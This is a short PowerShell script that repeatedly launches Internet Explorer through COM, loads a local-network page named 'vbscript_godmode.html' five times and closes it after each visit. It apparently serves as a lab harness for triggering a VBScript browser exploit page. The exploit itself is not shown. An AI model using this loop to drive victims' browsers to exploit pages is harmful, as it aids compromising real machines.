#$ie=new-object -com internetexplorer.application
$Url ="http://192.168.100.52/vbscript_godmode.html"
#$Url ="http://192.168.100.30/vbscript_godmode.html"
#$Url ="http://192.168.100.52"
#$Url ="http://elbotola.com"


$val=0

while($val -ne 5)
     {
           $val++ ;
 		$ie=new-object -com internetexplorer.application
        $ie.navigate2($Url)
		$ie.visible=$true
        sleep 14
        $ie.Quit()
		$ie=$null
		[GC]::collect()
      # sleep 4 
     }